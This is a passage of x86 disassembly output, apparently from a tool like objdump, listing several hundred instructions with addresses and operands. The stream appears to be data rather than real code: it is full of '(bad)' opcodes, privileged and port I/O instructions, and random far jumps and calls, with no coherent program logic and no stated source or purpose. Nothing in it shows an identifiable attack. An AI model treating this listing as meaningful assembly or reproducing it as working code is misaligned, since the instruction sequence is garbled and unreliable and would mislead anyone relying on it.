  41ac98:	mov    dh,BYTE PTR ds:0x3adf4964
  41ac9e:	xor    esi,DWORD PTR [edx+0x7a]
  41aca1:	es lahf 
  41aca3:	outs   dx,DWORD PTR gs:[esi]
  41aca5:	push   ebp
  41aca6:	add    esi,esp
  41aca8:	mov    dh,0x5d
  41acaa:	and    DWORD PTR [ecx],esp
  41acac:	icebp  
  41acad:	retf   
  41acae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acaf:	shr    BYTE PTR [ebp-0x6a5ee1e4],1
  41acb5:	dec    edx
  41acb6:	dec    esp
  41acb7:	inc    eax
  41acb8:	jecxz  0x41ad1c
  41acba:	aam    0x72
  41acbc:	lds    esp,FWORD PTR [ebx-0x36bcaa9a]
  41acc2:	js     0x41acac
  41acc4:	add    esi,DWORD PTR [edx+0x5a]
  41acc7:	cs ret 0xa7c6
  41accb:	inc    ebp
  41accc:	in     al,dx
  41accd:	aam    0xf8
  41accf:	sbb    bh,BYTE PTR [eax+0x7538d6b2]
  41acd5:	xor    BYTE PTR [ebx*8+0x28bffd57],cl
  41acdc:	dec    edi
  41acdd:	repnz scas al,BYTE PTR es:[edi]
  41acdf:	mov    esp,0xa24112a7
  41ace4:	mov    eax,ds:0x361b640d
  41ace9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acea:	cmp    al,0xb1
  41acec:	mov    eax,0xee24aad7
  41acf1:	sbb    eax,0x4b59fd00
  41acf6:	sub    al,0xe1
  41acf8:	cmp    eax,0x8a57f09c
  41acfd:	push   ebp
  41acfe:	dec    eax
  41acff:	outs   dx,BYTE PTR ds:[esi]
  41ad00:	(bad)  
  41ad01:	mov    bl,0xf4
  41ad03:	and    ebx,DWORD PTR [ebp-0x75]
  41ad06:	adc    eax,0xea9a1dff
  41ad0b:	push   ss
  41ad0c:	cmp    dl,BYTE PTR [esi+0x44]
  41ad0f:	pop    esp
  41ad10:	ds stc 
  41ad12:	jns    0x41acd6
  41ad14:	mov    bh,0x5c
  41ad16:	xchg   ebx,eax
  41ad17:	cmp    BYTE PTR [ebx+0x74cb7f3f],ah
  41ad1d:	hlt    
  41ad1e:	retf   
  41ad1f:	sahf   
  41ad20:	sbb    BYTE PTR [edx],cl
  41ad22:	mov    bh,0x8b
  41ad24:	rcl    DWORD PTR [ebx*2+0x284692ff],cl
  41ad2b:	fmul   st,st(0)
  41ad2d:	sbb    al,0x4c
  41ad2f:	cwde   
  41ad30:	loopne 0x41ad9f
  41ad32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad33:	in     al,dx
  41ad34:	paddw  mm3,mm3
  41ad37:	pop    es
  41ad38:	pop    edx
  41ad39:	outs   dx,DWORD PTR ds:[esi]
  41ad3a:	jne    0x41ad88
  41ad3c:	out    0x7e,al
  41ad3e:	add    BYTE PTR [esi-0x7b],cl
  41ad41:	pop    ebx
  41ad42:	dec    ebp
  41ad43:	push   es
  41ad44:	xlat   BYTE PTR ds:[ebx]
  41ad45:	mov    fs,WORD PTR [esi-0x7c8a1508]
  41ad4b:	sub    eax,0x7fd2b761
  41ad50:	enter  0xfae0,0x7f
  41ad54:	mov    cl,0x9a
  41ad56:	retf   0xd4d1
  41ad59:	and    ecx,0x35
  41ad5c:	push   ecx
  41ad5d:	xor    al,0x73
  41ad5f:	sar    BYTE PTR [edi+0x60b05f67],1
  41ad65:	pop    edx
  41ad66:	rcr    DWORD PTR [esi+ecx*1],0xb1
  41ad6a:	daa    
  41ad6b:	out    dx,eax
  41ad6c:	inc    edi
  41ad6d:	mov    ebp,0xaa682a56
  41ad72:	test   DWORD PTR [eax-0x74e33196],0x46321c6f
  41ad7c:	xor    ah,BYTE PTR [ebx-0x1a23fc9f]
  41ad82:	xor    dl,dl
  41ad84:	add    cl,cl
  41ad86:	add    eax,0x95efcba6
  41ad8b:	vdivpd ymm0,ymm2,ymm2
  41ad8f:	mov    ch,0xf2
  41ad91:	test   eax,0x69c1c845
  41ad96:	retf   
  41ad97:	jne    0x41ad37
  41ad99:	and    DWORD PTR [esi-0x5e],0x7f
  41ad9d:	mov    dl,0xa5
  41ad9f:	dec    edi
  41ada0:	and    al,0x14
  41ada2:	scas   al,BYTE PTR es:[edi]
  41ada3:	rcl    BYTE PTR [esi+0x79dd9827],0xa0
  41adaa:	cmp    eax,0x788923d0
  41adaf:	dec    esp
  41adb0:	das    
  41adb1:	or     BYTE PTR [eax],ah
  41adb3:	(bad)  
  41adb4:	pop    esp
  41adb5:	fmulp  st(1),st
  41adb7:	cmp    cl,BYTE PTR [eax-0x577d8534]
  41adbd:	mov    DWORD PTR [ecx],0x77f67bc8
  41adc3:	pop    eax
  41adc4:	and    eax,0xc431d02b
  41adc9:	pop    eax
  41adca:	add    DWORD PTR [eax],0x65107c29
  41add0:	mov    edi,0xd5abcd98
  41add5:	lds    eax,FWORD PTR [ebx+0x70]
  41add8:	fwait
  41add9:	xor    BYTE PTR [ebx+0x72],bl
  41addc:	inc    esi
  41addd:	cmp    edx,DWORD PTR ds:0x7b45a441
  41ade3:	sahf   
  41ade4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ade5:	xchg   esp,eax
  41ade6:	push   0x17
  41ade8:	and    BYTE PTR [esi-0x31195845],cl
  41adee:	push   edi
  41adef:	jl     0x41ae4d
  41adf1:	pop    es
  41adf2:	jo     0x41ae22
  41adf4:	cmc    
  41adf5:	cmp    DWORD PTR [edi+ebx*4],edi
  41adf8:	sbb    BYTE PTR [ebp-0x65de643],al
  41adfe:	mov    ah,0xc6
  41ae00:	stc    
  41ae01:	or     cl,ah
  41ae03:	push   edi
  41ae04:	mov    ds:0xc3ea8ac6,eax
  41ae09:	out    dx,eax
  41ae0a:	lods   al,BYTE PTR ds:[esi]
  41ae0b:	add    BYTE PTR [edx-0x5a],cl
  41ae0e:	loop   0x41ade2
  41ae10:	xchg   BYTE PTR cs:[edx+0x4bb4638f],dh
  41ae17:	rcl    BYTE PTR ds:0x2e8d6f16,cl
  41ae1d:	call   0xc29d:0x94f05425
  41ae24:	dec    ecx
  41ae25:	in     eax,dx
  41ae26:	or     al,0xc4
  41ae28:	mov    eax,0x4ad8835b
  41ae2d:	lods   eax,DWORD PTR ds:[esi]
  41ae2e:	mov    cl,0xc
  41ae30:	popa   
  41ae31:	mov    ch,0x8f
  41ae33:	dec    BYTE PTR [ecx+0x4b5bddf]
  41ae39:	cs mov bl,0x4
  41ae3c:	mov    bh,0x84
  41ae3e:	push   esp
  41ae3f:	inc    ebp
  41ae40:	xchg   edi,eax
  41ae41:	pop    esi
  41ae42:	and    DWORD PTR [edi-0x61],esi
  41ae45:	and    eax,0x3c32b944
  41ae4a:	fs mov edi,0x9f36171e
  41ae50:	test   DWORD PTR [edx-0x7],edi
  41ae53:	or     al,0x75
  41ae55:	pop    eax
  41ae56:	jmp    0xfe31:0xc7c5eae5
  41ae5d:	jno    0x41ae9f
  41ae5f:	cmp    DWORD PTR [esi-0x12],esi
  41ae62:	aaa    
  41ae63:	mov    al,ds:0x3872c089
  41ae68:	push   esp
  41ae6a:	cmp    esi,0x12
  41ae6d:	clc    
  41ae6e:	data16 mov ah,0x14
  41ae71:	adc    ebx,ebp
  41ae73:	mov    fs,WORD PTR [eax+0x2b01b33e]
  41ae79:	push   esi
  41ae7a:	mov    bl,0xcf
  41ae7c:	test   DWORD PTR [eax-0x7a],eax
  41ae7f:	mov    esp,ebx
  41ae81:	bound  ebx,QWORD PTR [ecx+eax*1+0x7e2181a8]
  41ae88:	dec    esp
  41ae89:	ror    BYTE PTR [esi+0x69805927],cl
  41ae8f:	cmp    dl,BYTE PTR [ebx+0x7d]
  41ae92:	arpl   WORD PTR [ebp+0xab8c5f2],bx
  41ae98:	ins    BYTE PTR es:[edi],dx
  41ae99:	push   esi
  41ae9a:	not    ecx
  41ae9c:	mov    dh,0x90
  41ae9e:	lds    edi,FWORD PTR [ebp-0x36]
  41aea1:	addr16 hlt 
  41aea3:	and    ecx,edx
  41aea5:	or     esp,DWORD PTR [ebp+0x1fd581a]
  41aeab:	adc    DWORD PTR [ebx+0x617ca96d],edx
  41aeb1:	fs jg  0x41ae43
  41aeb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeb5:	ins    DWORD PTR es:[edi],dx
  41aeb6:	jl     0x41ae7b
  41aeb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aeb9:	enter  0xfd0c,0x8e
  41aebd:	mov    eax,ds:0xd2c1c0de
  41aec2:	sar    DWORD PTR [esi-0x189ac1b1],1
  41aec8:	pop    ds
  41aec9:	pusha  
  41aeca:	cs xchg edi,eax
  41aecc:	inc    ebx
  41aecd:	ficom  WORD PTR [ebp-0x276a32e]
  41aed3:	inc    eax
  41aed4:	jno    0x41ae73
  41aed6:	inc    ebp
  41aed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aed8:	(bad)  
  41aed9:	std    
  41aeda:	fld    st(7)
  41aedc:	pcmpeqd mm7,QWORD PTR [ebx+0x60]
  41aee0:	cmp    dh,BYTE PTR [ebx+0x56]
  41aee3:	leave  
  41aee4:	je     0x41ae69
  41aee6:	jg     0x41af40
  41aee8:	outs   dx,BYTE PTR ds:[esi]
  41aee9:	pop    edx
  41aeea:	cld    
  41aeeb:	fwait
  41aeec:	push   ebx
  41aeed:	retf   0x66ee
  41aef0:	(bad)  
  41aef1:	fdiv   QWORD PTR [esi-0x30]
  41aef4:	mov    WORD PTR [edi-0x17],fs
  41aef7:	pop    ecx
  41aef8:	pop    ds
  41aef9:	push   ecx
  41aefa:	stos   DWORD PTR es:[edi],eax
  41aefb:	xor    eax,0x82860a35
  41af00:	retf   0x45a3
  41af03:	ret    0xc114
  41af06:	cdq    
  41af07:	in     eax,0xbf
  41af09:	xor    ah,BYTE PTR [ebx+eax*8-0x129f63e9]
  41af10:	mov    ds:0x556dfe29,eax
  41af15:	lock xor BYTE PTR [esi+0x72],ch
  41af19:	out    dx,eax
  41af1a:	clc    
  41af1b:	(bad)  
  41af1c:	mov    eax,ds:0xa140f998
  41af21:	out    0xa7,al
  41af23:	mov    BYTE PTR [ebx+0x7a],dh
  41af26:	xor    ebx,edx
  41af28:	mov    bl,BYTE PTR [ecx]
  41af2a:	test   eax,0xdb52abfb
  41af2f:	jns    0x41aee3
  41af31:	xchg   esi,eax
  41af32:	push   esp
  41af33:	jae    0x41aee2
  41af35:	scas   eax,DWORD PTR es:[edi]
  41af36:	xlat   BYTE PTR ds:[ebx]
  41af37:	leave  
  41af38:	repnz add al,0x72
  41af3b:	dec    eax
  41af3c:	enter  0xbc9d,0xc
  41af40:	ja     0x41aefb
  41af42:	repz dec esp
  41af44:	jbe    0x41afbf
  41af46:	ins    BYTE PTR es:[edi],dx
  41af47:	cmp    bl,BYTE PTR [esi-0x3e]
  41af4a:	in     al,0x40
  41af4c:	stos   BYTE PTR es:[edi],al
  41af4d:	fcom   DWORD PTR [ebx+ebp*2-0x110de6f1]
  41af54:	dec    edx
  41af55:	sub    BYTE PTR ds:0x48821b1a,al
  41af5b:	mov    cl,0xef
  41af5d:	rcl    DWORD PTR [edi+ebx*1-0x29],cl
  41af61:	nop
  41af62:	sbb    DWORD PTR [edx+0x4c3be332],ecx
  41af68:	test   eax,0x2aeb82aa
  41af6d:	push   ds
  41af6e:	push   ebp
  41af6f:	dec    ebx
  41af70:	stc    
  41af71:	fwait
  41af72:	stc    
  41af73:	rsqrtps xmm4,XMMWORD PTR [edx]
  41af76:	nop
  41af77:	jg     0x41af9d
  41af79:	sub    al,0xb9
  41af7b:	gs adc bl,ch
  41af7e:	jmp    0x41affd
  41af80:	sub    BYTE PTR [ebx],dh
  41af82:	daa    
  41af83:	mov    dh,0x7d
  41af85:	push   esp
  41af86:	cmc    
  41af87:	in     eax,0xa4
  41af89:	or     al,0xbf
  41af8b:	sahf   
  41af8c:	(bad)
  41af8f:	fndisi(8087 only) 
  41af91:	into   
  41af92:	int    0x7b
  41af94:	cmp    al,0x7a
  41af96:	test   al,0x42
  41af98:	pop    ebp
  41af99:	sub    al,0x19
  41af9b:	not    DWORD PTR [eax-0x13]
  41af9e:	repz pop ebx
  41afa0:	repnz mov ds:0x85d99aa,eax
  41afa6:	pusha  
  41afa7:	cmp    BYTE PTR [esi],bh
  41afa9:	int3   
  41afaa:	xor    ch,cl
  41afac:	mov    BYTE PTR [esi-0x14181506],dl
  41afb2:	je     0x41af47
  41afb4:	dec    edi
  41afb5:	mov    ebx,0x16e38a29
  41afba:	jge    0x41afca
  41afbc:	into   
  41afbd:	xor    dl,bh
  41afbf:	mov    BYTE PTR ds:0x238f486f,dl
  41afc5:	test   al,0xaf
  41afc7:	xchg   esp,eax
  41afc8:	or     cl,bl
  41afca:	pushf  
  41afcb:	jle    0x41af71
  41afcd:	retf   0x213b
  41afd0:	les    edx,FWORD PTR [edx+0x9]
  41afd3:	mov    ebx,0x5e834125
  41afd8:	mov    ch,0xc9
  41afda:	nop
  41afdb:	mov    ecx,0x92c2ab34
  41afe0:	aam    0x31
  41afe2:	or     al,0x82
  41afe4:	pop    ebp
  41afe5:	mov    cl,0x60
  41afe7:	jle    0x41b067
  41afe9:	xchg   ebx,eax
  41afea:	xchg   edi,eax
  41afeb:	ins    BYTE PTR es:[edi],dx
  41afec:	and    BYTE PTR [edx+0x3891326e],ch
  41aff2:	jae    0x41afba
  41aff4:	or     ebp,ebx
  41aff6:	cmp    DWORD PTR [ebp+0x6],0x346c0105
  41affd:	xchg   di,ax
  41afff:	in     eax,0x97
  41b001:	inc    edx
  41b002:	lods   al,BYTE PTR ds:[esi]
  41b003:	repz dec edi
  41b005:	call   0xefa:0x1ef719bd
  41b00c:	(bad)  
  41b00d:	pop    esi
  41b00e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b00f:	pusha  
  41b010:	xchg   ebp,eax
  41b011:	das    
  41b012:	sbb    al,0xbe
  41b014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b015:	cwde   
  41b016:	cs push ebp
  41b018:	xor    ecx,DWORD PTR [eax-0x1d53ef35]
  41b01e:	push   eax
  41b01f:	out    0x6c,al
  41b021:	dec    esi
  41b022:	pop    ss
  41b023:	inc    esi
  41b024:	push   cs
  41b025:	mov    ds:0xc237b3fb,al
  41b02a:	cs je  0x41aff9
  41b02d:	fidiv  DWORD PTR ss:[esi+0x761cadfb]
  41b034:	(bad)  [eax-0x72]
  41b037:	ja     0x41b062
  41b039:	adc    esi,edx
  41b03b:	cs mov al,0x42
  41b03e:	ret    
  41b03f:	jno    0x41b05a
  41b041:	jle    0x41b006
  41b043:	sar    BYTE PTR [esi+edx*2+0x65a06820],1
  41b04a:	ins    DWORD PTR es:[edi],dx
  41b04b:	adc    bl,ah
  41b04d:	dec    esi
  41b04e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b04f:	test   DWORD PTR [eax+edx*1+0x7a30171c],ecx
  41b056:	arpl   WORD PTR [eax-0x7d],cx
  41b059:	imul   ebx,DWORD PTR [edi+0x558b80b9],0x4f3b798a
  41b063:	inc    edx
  41b064:	mov    ebp,DWORD PTR [edx]
  41b066:	aaa    
  41b067:	sub    DWORD PTR [ebx+0x9],0x27d15999
  41b06e:	fist   DWORD PTR [edx-0x69]
  41b071:	mov    ebx,0xc314613d
  41b076:	jecxz  0x41b011
  41b078:	jnp    0x41afff
  41b07a:	(bad)  
  41b07b:	out    0x6f,eax
  41b07d:	adc    edi,DWORD PTR [eax-0x18ed4889]
  41b083:	sub    DWORD PTR [edi-0x6],0x53
  41b087:	mov    bl,BYTE PTR [esi+eax*4+0x1e01a3c4]
  41b08e:	es inc ebp
  41b090:	mov    eax,0x7538f637
  41b095:	push   ds
  41b096:	jnp    0x41b0d0
  41b098:	mov    ebp,0x49091b2a
  41b09d:	sbb    ebp,DWORD PTR es:[eax+0x1f]
  41b0a1:	repnz mov eax,0xf8615a37
  41b0a7:	pop    ebp
  41b0a8:	lea    esi,ds:0xc7caa31c
  41b0ae:	test   al,0x8a
  41b0b0:	jmp    0x41b0fe
  41b0b2:	ds jbe 0x41b0c3
  41b0b5:	cmp    bh,BYTE PTR [ebp+0x3d]
  41b0b8:	sub    eax,0xa35414f0
  41b0bd:	daa    
  41b0be:	cmp    DWORD PTR ds:0xc418631b,0xffffff8e
  41b0c5:	xchg   esi,eax
  41b0c6:	ret    
  41b0c7:	cdq    
  41b0c8:	les    esi,FWORD PTR [ebx]
  41b0ca:	in     eax,dx
  41b0cb:	xor    edx,ebp
  41b0cd:	or     al,0x10
  41b0cf:	cdq    
  41b0d0:	(bad)  [esi-0x48dbdc48]
  41b0d6:	sbb    BYTE PTR [ebx+0x1a5c32be],al
  41b0dc:	fstp   TBYTE PTR [esi-0x6893b8b4]
  41b0e2:	and    al,0xc2
  41b0e4:	cmp    DWORD PTR ds:0x1e6b77e2,esi
  41b0ea:	fdiv   DWORD PTR [edx+0x3c6cb104]
  41b0f0:	adc    bl,BYTE PTR [ebx+esi*1+0x19]
  41b0f4:	or     BYTE PTR [esi],ah
  41b0f6:	jecxz  0x41b0f8
  41b0f8:	add    DWORD PTR [esi+0xc],0x32
  41b0fc:	jecxz  0x41b15b
  41b0fe:	fbld   TBYTE PTR [edx]
  41b100:	mov    bh,0x8b
  41b102:	add    eax,0xe41cd396
  41b107:	imul   ebx,esp,0xffffffff
  41b10a:	retf   0xa194
  41b10d:	add    BYTE PTR [eax-0x3f],cl
  41b110:	mov    ebp,0x86c4b185
  41b115:	lahf   
  41b116:	ja     0x41b12d
  41b118:	retf   0x467c
  41b11b:	inc    ebp
  41b11c:	and    ebx,eax
  41b11e:	into   
  41b11f:	fucomip st,st(4)
  41b121:	inc    edi
  41b122:	cmp    eax,ecx
  41b124:	mov    ah,BYTE PTR [ecx-0x15]
  41b127:	jle    0x41b124
  41b129:	repnz ins BYTE PTR es:[edi],dx
  41b12b:	test   al,0x9f
  41b12d:	jno    0x41b0b0
  41b12f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b130:	adc    al,0x10
  41b132:	or     bl,0x4f
  41b135:	jns    0x41b1a0
  41b137:	and    al,0x1a
  41b13a:	add    al,0xae
  41b13c:	pop    ecx
  41b13d:	xor    eax,0xfff6c24
  41b142:	int    0x33
  41b144:	div    BYTE PTR [eax]
  41b146:	imul   esi,DWORD PTR [ebx+0x4bf96ebc],0x6e
  41b14d:	add    dh,dl
  41b14f:	xchg   edi,eax
  41b150:	pop    ecx
  41b151:	mov    ch,0x4d
  41b153:	ds push ss
  41b155:	into   
  41b156:	jmp    0x41b119
  41b158:	arpl   WORD PTR [ecx],cx
  41b15a:	dec    ebp
  41b15b:	add    DWORD PTR [eax-0x4f],esp
  41b15e:	gs jo  0x41b0e7
  41b161:	(bad)  
  41b162:	fld    QWORD PTR [edx]
  41b164:	fs dec eax
  41b166:	data16 jne 0x41b0ed
  41b169:	xchg   esi,eax
  41b16a:	pushf  
  41b16b:	pop    eax
  41b16c:	(bad)  
  41b16e:	int    0x89
  41b170:	jmp    FWORD PTR [edi-0x4a48c8ff]
  41b176:	and    BYTE PTR [eax+0x72f95919],cl
  41b17c:	fs push 0x18b57590
  41b182:	mov    eax,0xe7a2ea27
  41b187:	sbb    eax,0x5946e956
  41b18c:	mov    eax,ds:0x7e8b9143
  41b191:	xchg   BYTE PTR [ebx+0x32bbbc2a],bl
  41b197:	retf   0x4076
  41b19a:	es std 
  41b19c:	add    eax,0xef46a697
  41b1a1:	(bad)  
  41b1a2:	mov    ebp,0xd6e65acf
  41b1a7:	xor    al,0x59
  41b1a9:	xchg   BYTE PTR fs:[eax],ah
  41b1ac:	xlat   BYTE PTR ds:[ebx]
  41b1ad:	push   es
  41b1ae:	enter  0xd54b,0x77
  41b1b2:	bound  esi,QWORD PTR [ebp+0x7d55fa58]
  41b1b8:	dec    BYTE PTR [edx+ebx*2]
  41b1bb:	dec    ebp
  41b1bc:	fild   WORD PTR [edx]
  41b1be:	push   0x1e
  41b1c0:	aam    0x44
  41b1c2:	mov    dh,0x99
  41b1c4:	jbe    0x41b1f3
  41b1c6:	popa   
  41b1c7:	lods   eax,DWORD PTR ds:[esi]
  41b1c8:	push   edi
  41b1c9:	inc    edi
  41b1ca:	hlt    
  41b1cb:	push   es
  41b1cc:	fidiv  WORD PTR [ebp-0x254be1ff]
  41b1d2:	add    edx,edi
  41b1d4:	push   cs
  41b1d5:	in     al,0xc0
  41b1d7:	pusha  
  41b1d8:	jle    0x41b252
  41b1da:	es sbb al,0xfd
  41b1dd:	leave  
  41b1de:	xor    eax,0xe7b2ca28
  41b1e3:	(bad)  
  41b1e4:	stc    
  41b1e5:	sar    DWORD PTR [edx+0x29],cl
  41b1e8:	sbb    eax,0xd72b0761
  41b1ed:	ins    BYTE PTR es:[edi],dx
  41b1ee:	mov    es,WORD PTR [ebp-0x75]
  41b1f1:	test   al,0x5b
  41b1f3:	fist   DWORD PTR [esp+ecx*4+0x1043226b]
  41b1fa:	inc    edi
  41b1fb:	pop    ebp
  41b1fc:	in     al,dx
  41b1fd:	or     esi,DWORD PTR [edi+0x79]
  41b200:	js     0x41b1c9
  41b202:	ins    DWORD PTR es:[edi],dx
  41b203:	sub    esi,DWORD PTR [eax+0xf]
  41b206:	jmp    0xc703edc1
  41b20b:	fadd   DWORD PTR [ebx]
  41b20d:	cdq    
  41b20e:	dec    edi
  41b20f:	and    bh,BYTE PTR [edi+0x3b0b9827]
  41b215:	adc    bh,BYTE PTR [edi-0x507ec90e]
  41b21b:	adc    edi,DWORD PTR [eax]
  41b21d:	sub    eax,0x770faa5
  41b222:	mov    cl,0xca
  41b224:	jge    0x41b202
  41b226:	mov    al,0x4c
  41b228:	addr16 jae 0x41b1f8
  41b22b:	call   0xc663:0x6d1f74dd
  41b232:	dec    ecx
  41b233:	movsx  eax,BYTE PTR [edx-0x7e]
  41b237:	loop   0x41b27d
  41b239:	add    DWORD PTR [ecx],edx
  41b23b:	shr    BYTE PTR [ecx-0x4b91413b],0xb7
  41b242:	cld    
  41b243:	ins    DWORD PTR es:[edi],dx
  41b244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b245:	ror    BYTE PTR [ebp-0x5e936e8e],0x40
  41b24c:	push   ebx
  41b24d:	retf   0x5d62
  41b250:	enter  0x58c5,0x26
  41b254:	xchg   ebp,eax
  41b255:	loopne 0x41b2b2
  41b257:	or     bl,BYTE PTR [esp+edx*4-0x2166dbb1]
  41b25e:	dec    eax
  41b25f:	and    cl,BYTE PTR [eax-0x48]
  41b262:	push   cs
  41b263:	dec    ebx
  41b264:	add    al,0x8c
  41b266:	mov    ah,0x62
  41b268:	pop    esi
  41b269:	pop    esi
  41b26a:	dec    eax
  41b26b:	mov    al,0xb3
  41b26d:	cmp    al,0xc7
  41b26f:	retf   0x13c8
  41b272:	ins    DWORD PTR es:[edi],dx
  41b273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b274:	jecxz  0x41b290
  41b276:	out    dx,eax
  41b277:	dec    WORD PTR [esi+0x3a89617e]
  41b27e:	sbb    BYTE PTR [ebx],0x51
  41b281:	sbb    BYTE PTR [edi],dl
  41b283:	mov    ecx,DWORD PTR [bp+di]
  41b286:	adc    DWORD PTR [eax+ecx*4],edx
  41b289:	and    ah,bl
  41b28b:	jb     0x41b2da
  41b28d:	pop    ebp
  41b28e:	out    dx,eax
  41b28f:	iret   
  41b290:	sbb    ah,al
  41b292:	in     eax,0xcb
  41b294:	sbb    BYTE PTR [ebx],dh
  41b296:	or     al,0xd
  41b298:	xor    eax,0x56b4134f
  41b29d:	aaa    
  41b29e:	jecxz  0x41b311
  41b2a0:	xchg   ebx,eax
  41b2a1:	arpl   si,ax
  41b2a3:	sub    al,0x54
  41b2a5:	cmp    eax,0xd6b9ce60
  41b2aa:	add    BYTE PTR gs:[eax-0x4eeb3340],ch
  41b2b1:	sub    ch,bh
  41b2b3:	loop   0x41b258
  41b2b5:	or     cl,BYTE PTR es:[esi+ebp*8-0x42]
  41b2ba:	js     0x41b269
  41b2bc:	imul   ecx,DWORD PTR [esi+ebp*4+0x6b],0x37
  41b2c1:	cmp    ecx,ebx
  41b2c3:	scas   al,BYTE PTR es:[edi]
  41b2c4:	ficom  DWORD PTR [eax+esi*1]
  41b2c7:	jmp    0x41b2bc
  41b2c9:	(bad)  
  41b2ca:	icebp  
  41b2cb:	mov    dl,0xee
  41b2cd:	rcr    dh,cl
  41b2cf:	mov    ah,0x64
  41b2d1:	sar    ecx,1
  41b2d3:	stos   BYTE PTR es:[edi],al
  41b2d4:	aaa    
  41b2d5:	inc    edx
  41b2d6:	mov    al,0xfb
  41b2d8:	aad    0x8c
  41b2da:	leave  
  41b2db:	stos   DWORD PTR es:[edi],eax
  41b2dc:	jmp    0x7482:0x159c237c
  41b2e3:	fldcw  WORD PTR [eax-0x37]
  41b2e6:	jne    0x41b330
  41b2e8:	or     eax,DWORD PTR [eax]
  41b2ea:	stos   DWORD PTR es:[edi],eax
  41b2eb:	stos   BYTE PTR es:[edi],al
  41b2ec:	shl    BYTE PTR [ebp+0x2c],cl
  41b2ef:	int    0x15
  41b2f1:	sub    dh,cl
  41b2f3:	lock jge 0x41b2c1
  41b2f6:	xchg   BYTE PTR [ecx],al
  41b2f8:	or     al,0x76
  41b2fa:	add    edi,DWORD PTR [esi+0x2f20a6b1]
  41b300:	pop    esi
  41b301:	xchg   BYTE PTR [ecx-0x20],ah
  41b304:	lea    ebp,[ecx-0x4bd8212b]
  41b30a:	jle    0x41b28c
  41b30c:	add    al,0x66
  41b30e:	adc    esp,DWORD PTR [eax-0x3c]
  41b311:	sahf   
  41b312:	add    eax,0x3ceaaa4c
  41b317:	aad    0xfe
  41b319:	ins    BYTE PTR es:[edi],dx
  41b31a:	pop    ds
  41b31b:	aas    
  41b31c:	pop    ebx
  41b31d:	pop    ss
  41b31e:	or     al,0xe5
  41b320:	daa    
  41b321:	xor    al,0x3e
  41b323:	std    
  41b324:	js     0x41b39b
  41b326:	cmp    DWORD PTR [esi-0x791f6ab1],ebx
  41b32c:	push   eax
  41b32d:	push   ds
  41b32e:	sbb    al,0x44
  41b330:	shl    DWORD PTR [ecx+0x53bd0d2a],1
  41b336:	xor    esp,DWORD PTR [esi+0x42cd7aca]
  41b33c:	add    al,0x43
  41b33e:	dec    edx
  41b33f:	pop    DWORD PTR [edx]
  41b341:	test   DWORD PTR [esi-0x1eb75de0],0x8e755f8e
  41b34b:	nop
  41b34c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b34d:	jmp    0x75fc7ec
  41b352:	add    dl,BYTE PTR [eax]
  41b354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b355:	cmp    DWORD PTR [eax+0x24d7642b],edx
  41b35b:	fist   DWORD PTR [eax+0x5a]
  41b35e:	inc    esi
  41b35f:	and    ebp,DWORD PTR [ecx]
  41b361:	xchg   edx,eax
  41b362:	mov    DWORD PTR [esi],0x2127072
  41b368:	fist   DWORD PTR [esi-0x37]
  41b36b:	(bad)  
  41b36c:	push   ebp
  41b36d:	adc    DWORD PTR [edx+ebx*2+0x435de5d3],0xffffffea
  41b375:	retf   0x8d37
  41b378:	push   ss
  41b379:	mov    cl,0x11
  41b37b:	push   edx
  41b37c:	pop    edx
  41b37d:	inc    esp
  41b37e:	push   0xd
  41b380:	or     BYTE PTR [ecx],ah
  41b382:	mov    esi,0x9be410f6
  41b387:	pop    ebp
  41b388:	xchg   esi,eax
  41b389:	jne    0x41b387
  41b38b:	shr    ebx,0xdd
  41b38e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b38f:	sbb    bp,WORD PTR ds:0x6ae6f23c
  41b396:	push   edx
  41b397:	cdq    
  41b398:	xchg   esi,eax
  41b399:	fcomp  st(6)
  41b39b:	push   edx
  41b39c:	mov    edx,0xb38d158d
  41b3a1:	pop    esp
  41b3a2:	cmp    DWORD PTR [ebx+eiz*1-0x1e2e9470],0xc1bbb41
  41b3ad:	cmp    al,0xf1
  41b3af:	xor    esi,DWORD PTR [edx-0x77c36d6]
  41b3b5:	ins    BYTE PTR es:[edi],dx
  41b3b6:	in     al,0xd9
  41b3b8:	jg     0x41b37c
  41b3ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3bb:	adc    bh,BYTE PTR [eax+edx*8-0x5e64ca62]
  41b3c2:	mov    dh,0xa7
  41b3c4:	scas   al,BYTE PTR es:[edi]
  41b3c5:	mov    cl,0xc5
  41b3c7:	lock mov dl,0x73
  41b3ca:	xor    BYTE PTR [esi+esi*8],dh
  41b3cd:	mov    eax,0xed719c04
  41b3d2:	xchg   edx,eax
  41b3d3:	repz aas 
  41b3d5:	aad    0xd6
  41b3d7:	push   ebx
  41b3d8:	lea    esp,[esp+ecx*4]
  41b3db:	pop    ds
  41b3dc:	enter  0x70a2,0x60
  41b3e0:	enter  0xc84d,0x73
  41b3e4:	sar    BYTE PTR [edx+0x6d0e5c06],0x3e
  41b3eb:	pop    edi
  41b3ec:	in     eax,dx
  41b3ed:	sbb    edx,DWORD PTR [edx+0x7f29ef44]
  41b3f3:	pop    eax
  41b3f4:	scas   al,BYTE PTR es:[edi]
  41b3f5:	jp     0x41b39c
  41b3f7:	mov    ch,0x64
  41b3f9:	lock push esi
  41b3fb:	stos   BYTE PTR es:[edi],al
  41b3fc:	test   al,bl
  41b3fe:	mov    ebp,0x32a20c25
  41b403:	or     ch,BYTE PTR [eax-0x7ab8ed86]
  41b409:	push   edi
  41b40a:	sbb    DWORD PTR [esi-0x6ad8e493],esi
  41b410:	mov    ah,0x3e
  41b412:	mov    al,0x77
